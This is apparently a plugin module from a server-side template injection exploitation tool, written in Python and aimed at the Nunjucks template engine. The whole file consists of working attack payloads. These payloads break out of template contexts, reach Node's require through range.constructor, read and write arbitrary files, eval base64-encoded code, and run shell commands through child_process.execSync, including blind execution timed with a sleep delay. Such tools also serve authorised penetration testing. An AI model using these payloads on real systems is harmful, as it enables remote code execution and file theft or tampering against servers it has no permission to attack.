from utils.strings import quote
from plugins.languages import javascript
from utils.loggers import log
from utils import rand
import base64
import re

class Nunjucks(javascript.Javascript):
    
    def init(self):

        self.update_actions({
            'render' : {
                'render': '{{%(code)s}}',
                'header': '{{%(header)s}}',
                'trailer': '{{%(trailer)s}}',
                'test_render': '(%(n1)s,%(n2)s*%(n3)s)|dump' % {
                    'n1' : rand.randints[0],
                    'n2' : rand.randints[1],
                    'n3' : rand.randints[2]
                },
                'test_render_expected': '%(res)s' % {
                    'res' : rand.randints[1]*rand.randints[2]
                }
            },
            'write' : {
                'call' : 'inject',
                'write' : """{{range.constructor("global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')")()}}""",
                'truncate' : """{{range.constructor("global.process.mainModule.require('fs').writeFileSync('%(path)s', '')")()}}"""
            },
            'read' : {
                'call': 'evaluate',
                'read' : """global.process.mainModule.require('fs').readFileSync('%(path)s').toString('base64')"""
            },
            'md5' : {
                'call': 'evaluate',
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('%(path)s')).digest("hex")"""
            },
            'evaluate' : {
                'call': 'render',
                'evaluate' : """range.constructor("return eval(Buffer('%(code_b64)s','base64').toString())")()""",
                'test_os': """global.process.mainModule.require('os').platform()"""
            },
            'execute' : {
                'call': 'evaluate',
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """{{range.constructor("global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')")()}}"""
            },
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },

            { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '{{1', 'closures' : javascript.ctx_closures },
            { 'level': 1, 'prefix': '%(closure)s %%}', 'suffix' : '', 'closures' : javascript.ctx_closures },
            { 'level': 5, 'prefix': '%(closure)s %%}{%% endfor %%}{%% for a in [1] %%}', 'suffix' : '', 'closures' : javascript.ctx_closures },

            # This escapes string {% set %s = 1 %}
            { 'level': 5, 'prefix': '%(closure)s = 1 %%}', 'suffix' : '', 'closures' : javascript.ctx_closures },

            # Comment blocks
            { 'level': 5, 'prefix' : '#}', 'suffix' : '{#' },

        ])

